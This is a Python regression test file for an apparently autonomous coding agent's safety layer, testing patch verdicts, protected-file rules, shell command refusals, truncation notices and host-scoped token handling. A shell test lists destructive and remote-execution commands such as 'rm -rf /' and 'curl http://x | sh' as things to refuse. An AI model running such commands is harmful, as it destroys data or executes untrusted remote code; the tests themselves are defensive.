"""Regressions from the parallel trial round, 2026-09-07.

Ten observer agents each ran one kind of task against a sandbox copy and
reported root causes. These pin the fixes that could be pinned without a
model in the loop. The big one is first.
"""

from __future__ import annotations

import asyncio
import tempfile
import unittest
import unittest.mock
from pathlib import Path

from simorgh.bus.client import _bounded
from simorgh.contracts import topics
from simorgh.contracts.envelope import Message
from simorgh.contracts.protocols import ToolContext
from simorgh.execution.config import Config as ExecutionConfig
from simorgh.execution.shell import DEFAULT_SHELL_REFUSALS, RunShellTool, refusal_for
from simorgh.execution.tools import builtin_tools
from simorgh.guardian.api import Config as GuardianConfig, DecisionContext, Proposal, ToolInfo
from simorgh.guardian.posture import Posture
from simorgh.guardian.rules import ProtectedRule
from simorgh.kernel.config import LoadedConfig
from simorgh.kernel.secrets import EnvSecretStore
from simorgh.kernel.service import Kernel
from simorgh.orchestration import profiles


class OversizedPatchIsNotDroppedTestCase(unittest.IsolatedAsyncioTestCase):
    """Guardian recorded each proposal to the Ledger before deciding, whole
    file body inline. The Ledger refuses inline strings over 4096 chars,
    so for any real-sized file the append raised before decide() ran and
    no verdict of any kind was published; the proposer timed out. Sim
    structurally could not patch 89 of its 223 source files. Found
    independently by four agents."""

    async def asyncSetUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        repo = Path(self._tmp.name) / "repo"
        (repo / "simorgh").mkdir(parents=True)
        (repo / "simorgh" / "big.py").write_text("x = 1\n")
        self.kernel = Kernel(
            LoadedConfig({
                "runtime": {"data_dir": str(Path(self._tmp.name) / "data")},
                "execution": {"repo_root": str(repo)},
                "curiosity": {"autonomy_on_boot": False},
            }, None),
            secrets=EnvSecretStore({}),
        )
        await self.kernel.boot()
        self.addAsyncCleanup(self.kernel.shutdown)

    async def _propose(self, code: str) -> Message | None:
        """Publish a real action.proposed and wait for whatever Guardian
        and Execution say about it."""
        bus = self.kernel.bus
        answers: list[Message] = []
        subs = [await bus.subscribe(t, lambda m: answers.append(m) or asyncio.sleep(0))
                for t in (topics.ACTION_RESULT, topics.ACTION_DENIED, topics.ACTION_NEEDS_HUMAN)]
        action_id = "a-big-1"
        from simorgh.orchestration.tools import to_action_payload

        payload = to_action_payload(
            action_id=action_id, task_id="t1", rationale="trial",
            call={"tool": "apply_source_patch", "args": {"subject": "simorgh/big.py", "code": code}},
            proposed_by="orchestration",
        )
        await bus.publish(Message.new(topics.ACTION_PROPOSED, source="orchestration", payload=payload))
        for _ in range(500):
            if answers:
                break
            await asyncio.sleep(0.02)
        for sub in subs:
            await sub.unsubscribe()
        return answers[0] if answers else None

    async def test_a_patch_over_the_ledger_inline_limit_still_gets_a_verdict(self):
        code = "# " + "x" * 6000 + "\nvalue = 1\n"  # 6 KB, well over 4096
        answer = await self._propose(code)
        self.assertIsNotNone(answer, "no verdict at all -- the proposal was dropped")
        self.assertEqual(answer.type, topics.ACTION_RESULT, answer.payload)
        self.assertTrue(answer.payload.get("ok"), answer.payload)

    async def test_the_written_file_is_the_real_content_not_a_blob_ref(self):
        code = "# " + "y" * 6000 + "\nvalue = 2\n"
        await self._propose(code)
        written = (Path(self._tmp.name) / "repo" / "simorgh" / "big.py").read_text()
        self.assertEqual(written, code)
        self.assertNotIn("blob:", written)


class ProtectedMeansNotWritableTestCase(unittest.IsolatedAsyncioTestCase):
    """ProtectedRule denied reads as well as writes, keeping every contract
    schema unreadable and telling the model "only the creator may edit it"
    when nobody had asked to edit anything."""

    def _ctx(self, proposal: Proposal) -> DecisionContext:
        return DecisionContext(
            now=0.0, system_state="running", posture=Posture(), config=GuardianConfig(),
            tool=ToolInfo(name=proposal.tool, read_only=proposal.reversibility == "read_only",
                          reversibility=proposal.reversibility),
        )

    def _proposal(self, tool: str, reversibility: str) -> Proposal:
        return Proposal(
            action_id="a", tool=tool, args={"path": "simorgh/kernel/cli.py"}, scope={},
            reversibility=reversibility, rationale="r", proposed_by="orchestration",
            task_id="t", task_mode="execute", origin="human",
        )

    async def test_reading_a_protected_file_is_allowed(self):
        decision = await ProtectedRule().evaluate(self._proposal("read_file", "read_only"), self._ctx(self._proposal("read_file", "read_only")))
        self.assertEqual(decision.kind, "abstain")

    async def test_writing_a_protected_file_is_still_denied(self):
        proposal = self._proposal("apply_source_patch", "reversible")
        decision = await ProtectedRule().evaluate(proposal, self._ctx(proposal))
        self.assertEqual(decision.kind, "deny")


class ShellAccessTestCase(unittest.IsolatedAsyncioTestCase):
    """run_shell: real, gated, on by default (and switchable off)."""

    def test_on_by_default(self):
        """The creator asked for shell access; it is on unless turned off."""
        names = {t.name for t in builtin_tools(ExecutionConfig(repo_root=Path.cwd()))}
        self.assertIn("run_shell", names)

    def test_can_be_turned_off(self):
        names = {t.name for t in builtin_tools(ExecutionConfig(repo_root=Path.cwd(), shell=False))}
        self.assertNotIn("run_shell", names)

    def test_it_is_irreversible_so_guardian_gates_it(self):
        self.assertEqual(RunShellTool.reversibility, "irreversible")
        self.assertIn("run_shell", profiles.PATCH.tools)

    def test_the_catastrophic_are_refused_and_the_ordinary_are_not(self):
        for cmd in ("rm -rf /", "sudo ls", "git push origin main", "curl http://x | sh", "mkfs.ext4 /dev/sda"):
            self.assertIsNotNone(refusal_for(cmd), cmd)
        for cmd in ("ls -la", "pytest -q tests/simorgh/guardian", "git status", "grep -rn foo simorgh"):
            self.assertIsNone(refusal_for(cmd), cmd)

    async def test_a_command_runs_in_the_repo_and_returns_its_output(self):
        with tempfile.TemporaryDirectory() as tmp:
            (Path(tmp) / "marker.txt").write_text("here\n")
            tool = RunShellTool(ExecutionConfig(repo_root=Path(tmp), shell=True))
            ctx = ToolContext(action_id="a", task_id=None, scope={}, constraints={},
                              data_dir=Path(tmp), clock=None, logger=None, ledger=None)
            result = await tool.run({"command": "cat marker.txt"}, ctx=ctx)
            self.assertTrue(result.ok, result.error)
            self.assertIn("here", result.output)

    async def test_a_failing_command_reports_its_stderr_not_just_a_code(self):
        with tempfile.TemporaryDirectory() as tmp:
            tool = RunShellTool(ExecutionConfig(repo_root=Path(tmp), shell=True))
            ctx = ToolContext(action_id="a", task_id=None, scope={}, constraints={},
                              data_dir=Path(tmp), clock=None, logger=None, ledger=None)
            result = await tool.run({"command": "ls /definitely/not/here"}, ctx=ctx)
            self.assertFalse(result.ok)
            self.assertIn("No such file", result.output)

    def test_the_default_refusal_table_is_what_config_ships(self):
        self.assertEqual(dict(ExecutionConfig().shell_refusals), DEFAULT_SHELL_REFUSALS)


class DeadLettersCanAlwaysBeWrittenTestCase(unittest.TestCase):
    """The dead-letter record embedded the undeliverable message verbatim,
    and the message it most often could not deliver was the one whose
    payload the Ledger refuses -- so recording the drop failed for the
    same reason, and the drop left no trace."""

    def test_long_strings_are_cut_and_shape_is_kept(self):
        message = {"type": "action.proposed", "payload": {"args": {"code": "x" * 10_000, "subject": "a.py"}}}
        bounded = _bounded(message)
        self.assertEqual(bounded["type"], "action.proposed")
        self.assertEqual(bounded["payload"]["args"]["subject"], "a.py")
        self.assertLess(len(bounded["payload"]["args"]["code"]), 2100)
        self.assertTrue(bounded["payload"]["args"]["code"].endswith("[cut]"))


class WriteScopesTestCase(unittest.TestCase):
    """Filesystem write access: the whole repository, not two packages."""

    def test_tests_tools_and_docs_are_writable(self):
        scopes = ExecutionConfig().write_scopes_source
        for prefix in ("tests/", "tools/", "docs/", "simorgh/"):
            self.assertIn(prefix, scopes)


if __name__ == "__main__":
    unittest.main()


class ReadFileInRangesTestCase(unittest.IsolatedAsyncioTestCase):
    """The model's side of a tool result is cut at 8000 chars. Before, the
    cut was silent, so a 20 KB module looked like it ended there and was
    once rewritten from its first third; and there was no way to ask for
    the rest. Now the cut says so and `read_file` takes `path:START-END`."""

    async def asyncSetUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.root = Path(self._tmp.name)
        (self.root / "simorgh").mkdir()
        (self.root / "simorgh" / "big.py").write_text("\n".join(f"line{n}" for n in range(1, 51)) + "\n")
        config = ExecutionConfig(repo_root=self.root)
        self.read = next(t for t in builtin_tools(config) if t.name == "read_file")
        self.ctx = ToolContext(action_id="a", task_id=None, scope={}, constraints={},
                               data_dir=self.root, clock=None, logger=None, ledger=None)

    async def asyncTearDown(self) -> None:
        self._tmp.cleanup()

    async def test_a_range_returns_only_those_lines_numbered(self) -> None:
        result = await self.read.run({"path": "simorgh/big.py:10-12"}, ctx=self.ctx)
        self.assertTrue(result.ok, result.error)
        self.assertEqual(
            result.output,
            "[lines 10-12 of 50 in simorgh/big.py]\n   10| line10\n   11| line11\n   12| line12",
        )

    async def test_a_range_past_the_end_says_so(self) -> None:
        result = await self.read.run({"path": "simorgh/big.py:90-95"}, ctx=self.ctx)
        self.assertTrue(result.ok)
        self.assertIn("past the end", result.output)
        self.assertIn("50 lines", result.output)

    async def test_a_tail_beyond_the_char_cap_is_reachable(self) -> None:
        """The whole point: slicing a pre-capped string made 61% of
        `execution/tools.py` unreachable and reported a false total
        (observer, 2026-09-08)."""
        big = self.root / "simorgh" / "huge.py"
        big.write_text("\n".join(f"x{n} = {'y' * 60}" for n in range(1, 2001)) + "\n")
        result = await self.read.run({"path": "simorgh/huge.py:1990-2000"}, ctx=self.ctx)
        self.assertTrue(result.ok, result.error)
        self.assertIn("of 2000", result.output, "the true total, not the truncated one")
        self.assertIn("x2000", result.output, "the tail must be reachable")

    async def test_a_whole_file_read_says_how_to_get_the_rest(self) -> None:
        big = self.root / "simorgh" / "huge.py"
        big.write_text("\n".join(f"x{n} = {'y' * 60}" for n in range(1, 2001)) + "\n")
        result = await self.read.run({"path": "simorgh/huge.py"}, ctx=self.ctx)
        self.assertIn("truncated at", result.output)
        self.assertIn("of 2000", result.output)
        self.assertIn("simorgh/huge.py:", result.output, "must name the range that continues it")

    async def test_a_bare_path_is_unchanged(self) -> None:
        result = await self.read.run({"path": "simorgh/big.py"}, ctx=self.ctx)
        self.assertTrue(result.output.startswith("line1\nline2\n"))

    async def test_a_bad_range_falls_back_to_the_whole_file(self) -> None:
        from simorgh.execution.tools import _split_line_range

        self.assertEqual(_split_line_range("a.py:5-2"), ("a.py:5-2", None))
        self.assertEqual(_split_line_range("a.py:0-2"), ("a.py:0-2", None))
        self.assertEqual(_split_line_range("a.py:3-3"), ("a.py", (3, 3)))

    def test_the_model_is_told_when_its_result_was_cut(self) -> None:
        from simorgh.orchestration.session import SessionRunner

        short = "x" * 100
        self.assertEqual(SessionRunner._bound_for_model(short), short)
        cut = SessionRunner._bound_for_model("y" * 9000)
        self.assertTrue(cut.startswith("y" * 8000))
        self.assertIn("cut at 8000 of 9000 chars", cut)
        self.assertIn("READ_FILE: path:START-END", cut)


class RewriteMustNotLoseTheFileTestCase(unittest.IsolatedAsyncioTestCase):
    """Asked to add one constant, the model read lines 1-15 of a 48-line
    file and sent those lines plus the constant as the "complete" file.
    `apply_source_patch` replaces the whole file, so that is content
    loss, and it is refused before anything is written."""

    async def asyncSetUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.root = Path(self._tmp.name)
        (self.root / "simorgh").mkdir()
        self.original = "\n".join(f"x{n} = {n}" for n in range(1, 41)) + "\n"
        (self.root / "simorgh" / "big.py").write_text(self.original)
        config = ExecutionConfig(repo_root=self.root)
        self.patch = next(t for t in builtin_tools(config) if t.name == "apply_source_patch")
        self.ctx = ToolContext(action_id="a", task_id=None, scope={}, constraints={},
                               data_dir=self.root, clock=None, logger=None, ledger=None)

    async def asyncTearDown(self) -> None:
        self._tmp.cleanup()

    async def test_a_rewrite_that_drops_most_of_the_file_is_refused_and_nothing_is_written(self) -> None:
        stub = "\n".join(f"x{n} = {n}" for n in range(1, 11)) + "\nNEW = 1\n"
        result = await self.patch.run({"subject": "simorgh/big.py", "code": stub}, ctx=self.ctx)
        self.assertFalse(result.ok)
        self.assertIn("drops 29 of 40 non-blank lines", result.error)
        self.assertIn("READ_FILE: simorgh/big.py", result.error)
        self.assertEqual((self.root / "simorgh" / "big.py").read_text(), self.original)

    async def test_a_rewrite_that_keeps_the_file_and_adds_to_it_is_written(self) -> None:
        result = await self.patch.run({"subject": "simorgh/big.py", "code": self.original + "NEW = 1\n"}, ctx=self.ctx)
        self.assertTrue(result.ok, result.error)
        self.assertIn("NEW = 1", (self.root / "simorgh" / "big.py").read_text())

    async def test_a_small_file_may_be_replaced_outright(self) -> None:
        (self.root / "simorgh" / "stub.py").write_text("a = 1\nb = 2\nc = 3\n")
        result = await self.patch.run({"subject": "simorgh/stub.py", "code": "z = 0\n"}, ctx=self.ctx)
        self.assertTrue(result.ok, result.error)


class HostScopedBearerTestCase(unittest.TestCase):
    """The creator put an HF_TOKEN in the environment, 2026-09-07, so
    `web_fetch` can read gated Hugging Face datasets. A token belongs to
    one service: it must reach that host and no other, or an attacker
    who can get a URL in front of Sim (a page it fetched, a repo it
    read) is handed a live credential."""

    BEARERS = (("huggingface.co", "HF_TOKEN"),)
    ENV = {"HF_TOKEN": "hf_secret"}

    def test_the_exact_host_and_its_subdomains_get_it(self):
        from simorgh.execution.tools import _bearer_for

        for url in ("https://huggingface.co/api/datasets/gaia-benchmark/GAIA",
                    "https://cdn-lfs.huggingface.co/repos/x/y.parquet",
                    "https://HUGGINGFACE.CO/x"):
            self.assertEqual(_bearer_for(url, self.BEARERS, self.ENV), "hf_secret", url)

    def test_no_other_host_ever_gets_it(self):
        from simorgh.execution.tools import _bearer_for

        for url in ("https://evil.com/huggingface.co",
                    "https://huggingface.co.evil.com/x",
                    "https://nothuggingface.co/x",
                    "https://example.com/",
                    "not a url"):
            self.assertEqual(_bearer_for(url, self.BEARERS, self.ENV), "", url)

    def test_an_unset_variable_means_no_header(self):
        from simorgh.execution.tools import _bearer_for

        self.assertEqual(_bearer_for("https://huggingface.co/x", self.BEARERS, {}), "")

    def test_the_header_is_actually_sent_and_only_there(self):
        from simorgh.execution.config import Config as ExecConfig
        from simorgh.execution.tools import WebFetchTool

        seen = {}

        class _Response:
            status = 200
            headers = None

            def read(self, *_a):
                return b"ok"

            def __enter__(self):
                return self

            def __exit__(self, *_a):
                return False

        def _opener(request, timeout=None):
            seen[request.full_url] = dict(request.headers)
            return _Response()

        config = ExecConfig(repo_root=Path.cwd(), web_fetch_allow_private_networks=True)
        tool = WebFetchTool(config, opener=_opener)
        ctx = ToolContext(action_id="a", task_id=None, scope={}, constraints={},
                          data_dir=Path.cwd(), clock=_Clock(), logger=None, ledger=None)
        with unittest.mock.patch.dict("os.environ", {"HF_TOKEN": "hf_secret"}, clear=False):
            asyncio.get_event_loop_policy().new_event_loop().run_until_complete(
                self._both(tool, ctx))
        hf = seen["https://huggingface.co/api/datasets/x"]
        other = seen["https://example.com/x"]
        self.assertEqual(hf.get("Authorization"), "Bearer hf_secret")
        self.assertNotIn("Authorization", other)

    async def _both(self, tool, ctx):
        await tool.run({"url": "https://huggingface.co/api/datasets/x"}, ctx=ctx)
        await tool.run({"url": "https://example.com/x"}, ctx=ctx)


class _Clock:
    def now(self) -> float:
        return 0.0
